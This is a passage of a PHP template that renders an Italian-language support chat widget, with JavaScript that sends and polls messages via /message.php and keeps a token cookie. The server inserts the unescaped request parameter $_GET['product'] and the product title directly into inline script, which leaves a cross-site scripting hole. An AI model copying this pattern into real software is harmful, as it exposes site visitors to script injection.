<div class="with-status" style="display: inline-block;">
<div class="status-online" style="display: inline-block;">
</div>in linea</div>
</div>
</div>
</div>
</div>
<div class="chat-block">
<div id="chat">
<div class="operators-msg" id="greeting-msg" style="display: none;">
<div class="operators-photo"><img src="/operator-img.png"></div>
<div class="operators-first-text">Buongiorno! Come posso aiutarla?</div>
</div>
</div>
<div id="input-msg" style="display: flex;">
<input type="text" name="smstosup1" id="smstosup1" placeholder="Inserisci il tuo messaggio ...">
<button id="smstosupbutton1">
<div class="chaport-send-icon">
<svg width="18" height="18" viewBox="0 0 535.5 535.5">
<polygon points="0,497.25 535.5,267.75 0,38.25 0,216.75 382.5,267.75 0,318.75" fill="#b9bdbf">
</polygon>
</svg>
</div>
</button>
</div>
</div>
</div>
</div>
</div>
<div class="chaport-big-shadow"></div>
</div>
</div>
<script type="text/javascript">

var token = getCookie(\'tokena\');
			if (token =="") {
				var token = "'.$token.'";
			}
            var supportbutton = document.querySelector(\'.chaport-launcher-button\');
            var supportwindow = document.querySelector(\'.chaport-window\');


            supportbutton.onclick = function() {
                if (supportwindow.style.opacity == \'0\') {
                    supportwindow.style.opacity = \'1\';
                    supportwindow.style.visibility = \'visible\';
                } else {
                    supportwindow.style.opacity = \'0\';
                    supportwindow.style.visibility = \'hidden\';
                }
            };
                


            var docdoc = document,
                chatscroll = docdoc.querySelector(\'#chat\'),
                smstosupbutton = docdoc.querySelector(\'#smstosupbutton1\'),
                msgtext = docdoc.querySelector(\'#smstosup1\');
            
            smstosupbutton.onclick = function() {
                sendmsg();
                msgtext.value = \'\';
            }
            
            function msg_add(onemsg){
                var chatscroll = document.getElementById("chat"); 
                                    if (onemsg.sender=="f") {
                                        var msgwindow = document.createElement(\'div\');
                                            msgwindow.setAttribute(\'class\', \'visitors-msg-text\');
                                            msgwindow.setAttribute(\'id\', onemsg.id);
                                            msgwindow.innerText = onemsg.message;
                                            chatscroll.appendChild(msgwindow);
                                    } else if (onemsg.sender=="t") {
                                        var docdoc2 = document,
                                            msgwindowbig = docdoc2.createElement(\'div\'),
                                            msgwindow = docdoc2.createElement(\'div\'),
                                            operphoto = docdoc2.createElement(\'div\'),
                                            operphoto2 = docdoc2.createElement(\'img\');
                                            msgwindowbig.setAttribute(\'class\', \'operators-msg\');
                                            msgwindowbig.setAttribute(\'style\', \'display: flex;\');
                                            operphoto.setAttribute(\'class\', \'operators-photo\');
                                            operphoto2.setAttribute(\'src\', \'/operator-img.png\');

                                            msgwindow.setAttribute(\'class\', \'operators-msg-text\');
                                            msgwindow.setAttribute(\'id\', onemsg.id);
                                            msgwindow.innerText = onemsg.message;
                                            msgwindowbig.appendChild(operphoto);
                                            operphoto.appendChild(operphoto2);
                                            msgwindowbig.appendChild(msgwindow);
                                            chatscroll.appendChild(msgwindowbig);
                                            supportwindow.style.opacity = \'1\';
                                            supportwindow.style.visibility = \'visible\';
                                    }
                                    chatscroll.scrollIntoView(false);
            }

            function ajaxsup(reg) { 
                var request = new XMLHttpRequest();
                var token = getCookie(\'tokena\'); 
                    if (token =="") {
                        var token = "'.$token.'";
                setCookie(\'tokena\', token);
                    }
                request.onreadystatechange = function() {
                    if (request.readyState == 4 && request.status == 200) { 
                        var resultstring = request.responseText; 
                        resultstring = JSON.parse(resultstring);
                        resultstring.forEach(function(onemsg) {  
                               msg_add(onemsg);
                        })
                    }
                }
                request.open(\'POST\', \'/message.php\');
                request.setRequestHeader(\'Content-Type\', \'application/x-www-form-urlencoded\');
                request.send(\'token='.$token.'&get=\'+reg+\'&product='.$_GET['product'].'\');
            }
            function sendmsg() {
                var request = new XMLHttpRequest();
                setCookie(\'tokena\', token);
                request.onreadystatechange = function() {
                    if (request.readyState == 4 && request.status == 200) { 
                        
                    }
                }
                msg_add({sender:"f",message:msgtext.value,id:"fff"});


                request.open(\'POST\', \'/message.php\');
                request.setRequestHeader(\'Content-Type\', \'application/x-www-form-urlencoded\');
                request.send(\'send=1&product='.$_GET['product'].'&token='.$token.'&title='.$product->title.'&message=\' + msgtext.value);
            }
            function getCookie(cname) {
                var name = cname + "=";
                var decodedCookie = decodeURIComponent(document.cookie);
                var ca = decodedCookie.split(\';\');
                for(var i = 0; i <ca.length; i++) {
                  var c = ca[i];
                  while (c.charAt(0) == \' \') {
                    c = c.substring(1);
                  }
                  if (c.indexOf(name) == 0) {
                    return c.substring(name.length, c.length);
                  }
                }
                return "";
              }
      
              function setCookie(cname, cvalue) {
                var d = new Date();
                    d.setTime(d.getTime() + (6*60*60*1000));
                var expires = "expires="+ d.toUTCString();
                document.cookie = cname + "=" + cvalue + ";" + expires + ";path=/";
              }
        </script>
<script type="text/javascript"> 
window.onload = function() { 
ajaxsup(1); 
} 
setInterval(function(){ajaxsup(0);}, 10000); 
</script>
</body>
</html>


';
